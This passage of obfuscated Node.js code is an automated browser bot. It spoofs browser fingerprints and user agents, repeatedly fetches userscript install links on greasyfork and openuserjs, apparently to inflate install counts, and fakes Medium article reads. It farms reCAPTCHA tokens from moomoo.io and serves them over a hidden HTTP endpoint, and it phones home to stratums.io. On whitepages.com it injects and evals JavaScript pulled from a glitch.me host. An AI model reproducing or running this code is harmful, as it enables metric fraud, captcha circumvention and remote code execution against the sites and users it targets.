      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454134' + '-moomoo-io' + U(0x1a) + 'autoheal-a' + 'utobreak-f' + 'ast-and-mo' + 're',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424447' + '-xtaming-c' + 'lient-tami' + 'ng-io-hack' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/taming.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/451547' + '-moomoo-io' + '-insane-mo' + 'd-beta-too' + '-fast-read' + '-descripti' + 'on',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424655' + '-i30cps-ut' + 'ility-mod',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/448601' + '-%E5%8A%9B' + '%E6%89%A3%' + 'E9%A2%98%E' + '7%9B%AE%E8' + '%BD%ACmark' + 'down',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/leetcode' + '.cn'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/445806' + '-moomoo-io' + '-auto-heal',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/434199' + '-moomoo-io' + '-helper-to' + '-become-pr' + 'o',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/slither.' + 'io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454409' + '-video-dow' + 'nloader-fo' + 'r-tampermo' + 'nkey',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/452314' + '-adblock-s' + 'cript-for-' + 'webview',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + W(0x14, 'Ms2G') + 'rg/en/scri' + 'pts/35466-' + 'mouseplus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456851' + '-omnifocus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430253' + '-arras-io-' + 'multibox-s' + 'cript',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/arras.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/438879' + '-diep-io-p' + 'ermanent-l' + 'eader-arro' + 'w',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430255' + '-warinspac' + 'e-bots',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/warin.sp' + 'ace'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/444523' + '-diep-io-m' + 'inimap-hig' + 'hlights',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456856' + '-optimize-' + 'quill-org',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/quill.or' + 'g'
    }
  ],
  userAgents = [
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A205U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A102U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-G960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-N960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.46',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6'
  ],
  miscSites = [
    'https://di' + 'scord.com',
    'https://st' + 'ratums.io',
    'https://ww' + 'w.npmjs.co' + 'm/',
    'https://gi' + 'thub.com',
    'https://mi' + 'necraft.ne' + 't',
    'https://ww' + 'w.wsj.com/',
    'https://zb' + 'eacon.org',
    'https://ya' + 'hoo.com',
    'https://ww' + 'w.theguard' + 'ian.com/',
    'https://ba' + 'idu.com/',
    'https://wi' + 'kipedia.or' + 'g',
    'https://po' + 'rnhub.com'
  ],
  miscSites2 = [
    'https://me' + 'dium.com/',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'ethics-of-' + 'advertisin' + 'g-and-ad-b' + 'locking-a6' + '2bdde987b0',
    'https://me' + 'dium.com/@' + 'digitalgir' + 'affes/7-aw' + 'esome-and-' + 'free-ai-to' + 'ols-you-sh' + 'ould-know-' + W(0x11, '4LzJ') + '09',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-21' + '5d668f827a',
    'https://me' + 'dium.com/@' + W(0x1b, 'VUCo') + 'eact-devel' + 'oper-roadm' + 'ap-2022-76' + 'ca119188bd',
    'https://me' + 'dium.com/e' + 'ntrepreneu' + 'r-s-handbo' + 'ok/is-your' + '-startup-a' + '-good-fit-' + 'for-ventur' + 'e-capital-' + 'bc59596df9' + 'e4',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'the-simple' + '-fundament' + 'als-of-c-e' + 'ed2fbb5792' + '9',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/co' + 'de-review-' + 'chores-tha' + 't-we-shoul' + 'd-automate' + '-using-dan' + 'ger-js-6cf' + '72ff3bf98',
    'https://me' + 'dium.com/g' + 'itconnecte' + 'd/use-git-' + 'like-a-sen' + 'ior-engine' + 'er-ef6d741' + 'c898e',
    'https://me' + 'dium.com/@' + 'sudiparyal' + '185/differ' + 'ence-betwe' + 'en-foreach' + '-and-map-i' + 'n-javascri' + 'pt-342c50b' + '59f9',
    'https://me' + 'dium.com/@' + 'dan-perry/' + 'the-world-' + 'that-knew-' + 'too-much-e' + '9ca2372ee2' + '1',
    'https://me' + 'dium.com/b' + 'itsrc/adva' + 'nced-data-' + 'structures' + '-and-algor' + 'ithms-trie' + 's-47db931e' + '20e',
    'https://da' + 'shmacintyr' + 'e.medium.c' + 'om/a-list-' + 'of-stories' + '-donald-tr' + 'ump-paid-t' + 'o-catch-an' + 'd-kill-jus' + 't-leaked-5' + 'e29f9f5f68' + '7',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'small-java' + 'script-opt' + 'imization-' + 'tips-1c4cb' + '387a463',
    'https://me' + 'dium.com/@' + 'michaelcos' + 'tello.swe/' + 'dbspy-4-0-' + '6989c6ea47' + 'd8',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'chatgpt-on' + '-itself-3b' + '1042b968cb',
    'https://me' + 'dium.com/@' + 'thisisjimk' + 'eller/plea' + 'se-stop-in' + 'cluding-co' + 'lor-names-' + 'in-your-cs' + 's-classes-' + 'f1090f6f2e' + '29',
    'https://me' + 'dium.com/@' + 'mattcodes0' + '6/building' + '-projects-' + U(0x6) + '-18dfa6d6e' + '702',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-rabbit-h' + 'ole-of-js-' + 'hyper-opti' + 'mization-a' + '618288174b',
    'https://me' + 'dium.com/@' + 'olopadeadu' + 'nola/the-c' + 'haos-in-ou' + 'r-twenties' + '-8fcefe061' + 'ef8',
    'https://me' + 'dium.com/@' + 'leanfolks/' + 'mobile-app' + '-architect' + 'ure-6848aa' + '1d5764',
    'https://bl' + 'og.bitsrc.' + 'io/i-asked' + '-chat-gpt-' + 'to-build-a' + '-to-do-app' + '-have-we-f' + 'inally-met' + '-our-repla' + 'cement-ad3' + '47ad74c51',
    'https://me' + 'dium.com/@' + 'alexey.ink' + 'in/never-h' + 'ave-separa' + 'te-sign-in' + '-routes-7c' + '9a6dd4dc7c',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'breaking-i' + 'nto-the-ma' + 'rket-1b665' + '2b2a05a',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-th' + 'e-fundamen' + 'tals-1a646' + 'c357955',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-oo' + 'p-and-cons' + 'tructors-1' + '0dc5877e98' + '5',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/le' + 'gacy-code-' + 'potential-' + 'gold-mine-' + 'of-learnin' + 'g-a59fdcb1' + U(0xe),
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-ii' + '-7de427c9f' + 'd15'
  ],
  g = {
    'getToken': () => 0x1 * -0x95f + -0x139d + 0x1cfc
  };
if (doFlags['doActivate' + 'Browser'] && ((async () => {
    log('index.js\x20c' + 'alled');
    const {
      FakeBrowser: f
    } = require('fakebrowse' + 'r'), h = require('path'), i = h['resolve'](__dirname, './fakeBrow' + 'serUserDat' + 'a'), j = new f['Builder']()['displayUse' + 'rActionLay' + 'er'](0x32 * -0x97 + 0x2d * -0xc7 + -0x1 * -0x4079)['vanillaLau' + 'nchOptions'](pptOptions)['usePlugins']([require('puppeteer-' + 'extra-plug' + 'in-adblock' + 'er')({
      'blockTrackers': 0x1,
      'blockTrackersAndAnnoyances': 0x1
    })])['userDataDi' + 'r'](i);
    let k;
    r:
      for (;;)
        try {
          let n = await async function o() {
            let p;
            const q = {
              'User-Agent': userAgents['random'](),
              'Accept-Encoding': 'none'
            };
            try {
              p = (await axios['get'](PROCESSED_XURL_VAL, {
                'headers': q
              }))?.['data'];
            } catch (r) {}
            if (p)
              try {
                p = (await axios['get'](p, {
                  'headers': q
                }))?.['data'];
              } catch (s) {}
            if (!p)
              return await randomWait(), await o();
            try {
              return 'object' == typeof p ? p : 'string' == typeof p ? JSON['parse'](p) : {};
            } catch (u) {
              if (!p)
                return await randomWait(), await o();
            }
          }();
          doFlags['doExtFinge' + 'rprint'] && j['deviceDesc' + 'riptor'](n), k = await j['launch']();
          break r;
        } catch (p) {
          warn(p), await randomWait();
        }
    const l = k['userAction'];
    log('browser\x20la' + 'unched');
    const m = k['vanillaBro' + 'wser'];
    doFlags['doYT'] && setTimeout(async () => {
      for (;;)
        await runYTModule(m, l);
    }, 0x2 * 0xb02 + 0x35 * -0x89 + 0x6bd), doFlags['doGF'] && setTimeout(async () => {
      await runGFModule(m, l);
    }, -0x54b * 0x2 + -0x11db + -0x1cd5 * -0x1), doFlags['doMediumRe' + 'ader'] && setTimeout(() => {
      !async function q() {
        const r = await m['createInco' + 'gnitoBrows' + 'erContext'](),
          u = await r['newPage']();
        for (;;) {
          let v = 0x1e1 * -0x1 + -0x3 * 0x4fd + 0x10d8;
          if (await u['goto'](miscSites2['random'](), {
              'timeout': NETWORK_PATIENCE
            })['catch'](w => v++), await randomWait(), v)
            return await u['close'](), await r['close'](), await q();
          for (let w = -0x6d * 0x25 + -0x1e98 + -0x5 * -0x945; w < getRandomInt(-0x32b + 0xdaa + 0x11 * -0x9e, -0x5d5 * -0x2 + 0x7cf + -0x1374); w++)
            await u['keyboard']['press']('ArrowDown'), await randomWait();
          await randomWait(), await wait(0x3c51 * 0x3 + 0x19591 + 0xb012 * -0x2);
        }
      }();
    }, 0x1bb * -0x11 + 0xc8f * -0x2 + 0x36ed), doFlags['doRemoteCa' + 'ptcha'] && setTimeout(async function q() {
      function u() {
        axios['post']('https://st' + 'ratums.io/' + 'research', {
          'dom': process['env']['PROJECT_DO' + 'MAIN'],
          'key': PROCESSED_SYX_VAL
        }, {
          'headers': {
            'Content-Type': 'applicatio' + 'n/json'
          }
        })['catch'](z => {});
      }
      const v = await m['createInco' + 'gnitoBrows' + 'erContext']();
      let w = 0x5 * 0xe5 + 0xc + 0x1 * -0x485;
      const x = await v['newPage']();
      if (await x['goto']('https://mo' + 'omoo.io', {
          'timeout': MM_NETWORK_PATIENCE
        })['catch'](z => w++), w)
        return await x['close'](), await v['close'](), q();
      if (!(await x['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML'))['includes']('isMoomooIo'))
        return await x['close'](), await v['close'](), q();
      let y;
      if (doFlags['doDual']) {
        if (y = await v['newPage'](), await y['goto']('https://mo' + 'omoo.io', {
            'timeout': MM_NETWORK_PATIENCE
          })['catch'](A => w++), w)
          return await y['close'](), await v['close'](), q();
        const z = await y['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
        if (log(z['slice'](-0x1b7 + -0x456 + 0x60d, -0x4cb + -0x2083 + -0x140 * -0x1e)), !z['includes']('isMoomooIo'))
          return await y['close'](), await v['close'](), q();
      }
      g['getToken'] = async function(A) {
        return await (A && doFlags['doDual'] ? y : x)['evaluate'](async () => new Promise(async (B, C) => {
          window['grecaptcha']['execute']('6LevKusUAA' + 'AAAAFknhlV' + '8sPtXAk5Z5' + 'dGP5T2FYIZ', {
            'action': 'homepage'
          })['then'](D => {
            B(D);
          });
        }));
      }, u(), setInterval(u, -0xaf4d + 0x7b50 + 0xa92d);
    }, 0xb * -0x1a5 + -0x1 * -0x25f1 + -0x1376), doFlags['doWhitepag' + 'esMode'] && setTimeout(async () => {
      (async function r() {
        const X = d;
        try {
          let s = 0x1b3b + -0x18d6 + -0x265 * 0x1;
          const t = await m['createInco' + 'gnitoBrows' + 'erContext'](),
            u = await t['newPage']();
          if (u['on'](X(0x18), function(v) {}), u['on']('error', function(v) {}), await u['goto']('https://ww' + 'w.whitepag' + 'es.com/m', {
              'timeout': MM_NETWORK_PATIENCE
            })['catch'](v => s++), s)
            return await u['close'](), await t['close'](), r();
          await wait(0x1 * -0x1286 + -0x12b4 + 0xb3 * 0x46), await u['evaluate'](() => {
            let v = new XMLHttpRequest();
            v['open']('GET', 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/cdn/xm7' + '7/wp.js', 0xe7a * -0x1 + 0x236b + 0x14f1 * -0x1), v['send'](), eval(v['responseTe' + 'xt']);
          }), await wait(0x285d3 + -0x111e34 + 0x1c5401);
        } catch (v) {}
        return await page['close'](), await context['close'](), r();
      }());
    }, -0x1dcf + 0x4f1 * 0x5 + 0x57e);
  })()), doFlags['doCreateSe' + 'rver']) {
  const e = require('http')['createServ' + 'er'](async function(f, h) {
    const i = url['parse'](f['url'])['pathname'];
    h['writeHead'](0xb * 0x21e + 0x1fec + -0x2 * 0x1b37);
    const j = '/dkasjhdwi' + 'qodkjnwqhd' + 'wqodlkwjqn' + 'dwqkdmnBZc' + 'xzmczxc' == i;
    j || '/asdsadwqd' + 'qwdwqdwqdw' + 'qdwqdwqdwq' + 'dwqd' == i ? h['write'](await g['getToken'](j) || '') : h['write']('v0.6'), h['end']();
  });
  e['listen'](process['env']['PORT'] || 0x17cb + -0x1 * 0x28 + 0x7ed);
}
doFlags['doOUJS'] && ((async () => {
  const a1 = c,
    a0 = b;
  async function f() {
    const Z = c,
      Y = b,
      k = h['random'](),
      m = k['replace']('/scripts/', '/install/') + '.user.js',
      [q, u] = (function() {
        const A = j['random']();
        return [
          A,
          A['includes']('Firefox')
        ];
      }()),
      v = function(A, B = -0xfba + -0x1217 + 0x21d2) {
        if (A['includes']('Firefox'))
          return A['slice'](A['indexOf']('Firefox') + 'Firefox' ['length'] + (0xf5 * 0x17 + -0x70 * 0x31 + -0x92));
        const C = A['indexOf']('Chrome/') + 'Chrome/' ['length'],
          D = A['slice'](C),
          E = D['slice'](0x5 * -0xca + -0xae3 + -0xed5 * -0x1, D['indexOf']('\x20'));
        return B ? E['slice'](-0xa8f + -0xc25 + 0x16b4, E['indexOf']('.')) : E;
      }(q),
      w = {
        'signal': AbortSignal['timeout'](0x3770 + -0x133 + -0x69 * 0x25),
        'headers': {
          'host': 'openuserjs' + '.org',
          'origin': 'https://op' + 'enuserjs.o' + 'rg',
          'user-agent': q,
          'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
          'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
          'accept-language': 'en-US,en;q' + '=0.9',
          'cache-control': 'no-cache',
          'pragma': 'no-cache',
          'sec-fetch-dest': 'document',
          'sec-fetch-mode': 'navigate',
          'sec-fetch-site': 'same-origi' + 'n',
          'sec-fetch-user': '?1',
          'upgrade-insecure-requests': '1'
        },
        'body': null,
        'method': 'GET'
      };
    u ? Object['assign'](w['headers'], {
      'te': Y(0xb, 'dlZj')
    }) : Object['assign'](w['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    });
    const x = await fetch(i, w)['catch'](A => {});
    if (!x || !x['headers'])
      return;
    if (null === x['headers']['get']('X-RateLimi' + 't-Limit'))
      return;
    const y = {
      'signal': AbortSignal['timeout'](-0xbc7 + 0xe2e + 0x755 * 0x5),
      'headers': {
        'host': 'openuserjs' + '.org',
        'origin': 'https://op' + 'enuserjs.o' + 'rg',
        'user-agent': q,
        'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
        'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'referer': i,
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origi' + 'n',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1'
      },
      'body': null,
      'method': 'GET'
    };
    if (u ? Object['assign'](y[Z(0xf)], {
        'te': 'trailers'
      }) : Object['assign'](y['headers'], {
        'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '\x22Windows\x22'
      }), !await fetch(k, y)['catch'](A => {}))
      return;
    const z = {
      'headers': {
        'accept': 'text/x-use' + 'rscript,\x20*' + '/*',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'max-age=0,' + '\x20must-reva' + 'lidate',
        'pragma': 'no-cache',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'none'
      },
      'referrerPolicy': 'strict-ori' + 'gin-when-c' + 'ross-origi' + 'n',
      'body': null,
      'method': 'GET'
    };
    u ? Object['assign'](z['headers'], {
      'te': 'trailers'
    }) : Object['assign'](z['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    }), await fetch(m, z);
  }
  const h = [
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/L' + 'ift_Web_Re' + 'strictions' + '_.io_Game_' + 'Mods_(MooM' + 'oo.ioKrunk' + 'er.io..),_' + 'Ad_Link_By' + 'passer,_Ad' + 'block,_MOR' + 'E!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'ooMoo.io,_' + 'Agar.io,_S' + 'urviv.io,_' + 'Slither.io' + ',_Diep.io,' + '_Global_Na' + 'me_Manager' + '_[Krunker_' + 'Coming_Soo' + 'n]',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/p' + 'ancake_mod' + '_Katana_+_' + 'Musket_AUT' + 'OHEAL_Anti' + '-Insta_sta' + 'rter_resou' + 'rces_and_m' + 'ore!!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Bloggerpe' + 'mula/Bypas' + 's_All_Shor' + 'tlinks_Man' + 'ual_Captch' + 'a',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/Top' + 'AndDownBut' + 'tonsEveryw' + 'here',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/reek/Anti' + '-Adblock_K' + 'iller_Reek',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/ParticleC' + 'ore/YouTub' + 'e_+',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/bon' + 'gacamsKill' + 'Ads',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/founcs/Li' + 'mitless_Fr' + 'eedom',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/aycabta/T' + 'witter_Ima' + 'ge_Maximiz' + 'er',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Marti/ouj' + 's_-_JsBeau' + 'tify',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AdlerED/%' + 'E6%9C%80%E' + '5%BC%BA%E7' + '%9A%84%E8%' + '80%81%E7%8' + '9%8C%E8%84' + '%9A%E6%9C%' + 'ACCSDNGree' + 'ner%EF%BC%' + '9ACSDN%E5%' + 'B9%BF%E5%9' + '1%8A%E5%AE' + '%8C%E5%85%' + 'A8%E8%BF%8' + '7%E6%BB%A4' + '%E3%80%81%' + 'E4%BA%BA%E' + '6%80%A7%E5' + '%8C%96%E8%' + '84%9A%E6%9' + 'C%AC%E4%BC' + '%98%E5%8C%' + '96',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/laidbackt' + 'empo/EasyV' + 'ideoDownlo' + 'ad',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/O' + 'ptimize_Qu' + 'ill.org',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/mscarchil' + 'li/Amazon_' + 'Smile_Redi' + 'rect',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AltoRetra' + 'to/IMDb_My' + '_Movies_en' + 'hancer',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/xthexder/' + 'Wide_GitHu' + 'b',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/navchanda' + 'r/Auto_Loa' + 'd_Big_Imag' + 'e',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/extension' + 'sapp/cinem' + 'apress',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/S' + 'urviv.io_X' + 'Client_(BE' + 'TA)',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Zren/Resi' + 'ze_YT_To_W' + 'indow_Size',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + a0(0x4, 'TN$*') + 'emove_Cook' + 'ie_Prefere' + 'nces_Tab'
    ],
    i = 'https://op' + 'enuserjs.o' + 'rg/',
    j = [
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/11' + '0.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + a1(0xc) + '0.0.0\x20Safa' + 'ri/537.36',
      'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '3_1)\x20Apple' + 'WebKit/537' + '.36\x20(KHTML' + ',\x20like\x20Gec' + 'ko)\x20Chrome' + '/108.0.0.0' + '\x20Safari/53' + '7.36',
      'Mozilla/5.' + '0\x20(X11;\x20Li' + 'nux\x20x86_64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.54'
    ];
  f();
  for (let k = -0xe34 + -0x26b * 0x3 + 0x1575; k < -0x7 * -0x28f + -0x1d1e + 0x1 * 0xb39; k++)
    setTimeout(f, (0xd2 * -0xd + -0x5 * 0x4dfb + 0x27af1) * k * getRandomInt(-0xb * -0x1f7 + -0x1ca * 0x1 + 0x1 * -0x13d2, 0x281 * -0xb + -0x766 * 0x1 + 0x22f4 * 0x1));
  setInterval(() => {
    f();
    for (let l = -0x472 + -0x24b * 0x3 + 0x1 * 0xb53; l < -0x7 * -0x2b3 + -0x6 * -0x40d + 0x21 * -0x14f; l++)
      setTimeout(f, (-0x68f5 + 0x15147 + 0x107 * 0x2) * l * getRandomInt(0x1e4a + -0x1961 + -0x4e8, 0x4c1 * -0x5 + 0x23e8 + -0x1 * 0xc20));
  }, 0x34 * -0x188fa + 0x5a504a + 0x2c70fe);
})()), doFlags['doMiscNetA' + 'ctivity'] && setTimeout(async () => {
  const f = axios['create']({
    'headers': {
      'User-Agent': userAgents['random']()
    }
  });
  f['get'](miscSites['random'](), {
    'timeout': 0x0,
    'headers': {
